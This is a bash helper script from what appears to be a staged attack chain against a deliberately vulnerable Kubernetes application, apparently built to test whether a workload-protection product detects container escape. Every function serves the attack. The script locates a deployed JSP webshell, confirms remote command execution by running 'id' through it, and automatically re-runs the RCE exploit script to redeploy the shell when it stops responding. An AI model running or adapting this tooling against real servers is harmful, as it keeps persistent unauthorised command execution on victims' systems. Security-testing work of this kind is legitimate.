#!/bin/bash
###############################################
# Webshell pre-check + auto-redeploy helper
# Sourced by attack/02..06-*.sh
#
# Requires (from the sourcing script):
#   HOST          target hostname (LB / NodePort)
#   SHELL_FILE    path to the shell-name file (/tmp/.k8s-escape-shell)
#   remote_exec() function that POSTs cmd to $SHELL_URL
#
# Provides:
#   SHELL_NAME / SHELL_URL  (re-assigned by _load_shell)
#   _load_shell             reads SHELL_FILE into SHELL_NAME / SHELL_URL
#   _webshell_alive         returns 0 if `id` over the webshell returns uid=...
#   ensure_webshell         calls 01-exploit-rce.sh on failure and retries
###############################################

_load_shell() {
    if [ -f "$SHELL_FILE" ]; then
        SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
        SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
    else
        SHELL_NAME=""
        SHELL_URL=""
    fi
}

_webshell_alive() {
    [ -z "$SHELL_URL" ] && return 1
    local out
    out=$(remote_exec "id" 2>/dev/null)
    [ -n "$out" ] && echo "$out" | grep -q "uid="
}

ensure_webshell() {
    _load_shell
    if _webshell_alive; then
        echo "  [OK] Webshell responding: $(remote_exec "id" | head -1)"
        return 0
    fi

    echo "  [WARN] Webshell not responding - auto-redeploying via step 1..."
    local SCRIPT_DIR REDEPLOY_RC
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[1]:-$0}")" && pwd)"
    if [ ! -x "${SCRIPT_DIR}/01-exploit-rce.sh" ] && [ ! -f "${SCRIPT_DIR}/01-exploit-rce.sh" ]; then
        echo "  [FAIL] 01-exploit-rce.sh not found at ${SCRIPT_DIR}/01-exploit-rce.sh"
        return 1
    fi
    HOST="$HOST" bash "${SCRIPT_DIR}/01-exploit-rce.sh"
    REDEPLOY_RC=$?
    if [ "$REDEPLOY_RC" -ne 0 ]; then
        echo "  [FAIL] Auto-redeploy failed (rc=$REDEPLOY_RC)"
        echo "         Check pod status: kubectl get pods -n vuln-app -o wide"
        echo "         If RESTARTS>0 in a few minutes, Cortex CWP is in prevention mode."
        return 1
    fi

    _load_shell    # SHELL_NAME changed (step 1 generates s<epoch>)
    if ! _webshell_alive; then
        echo "  [FAIL] Webshell still not responding after redeploy"
        return 1
    fi
    echo "  [OK] Webshell auto-redeployed: ${SHELL_NAME}.jsp"
    return 0
}
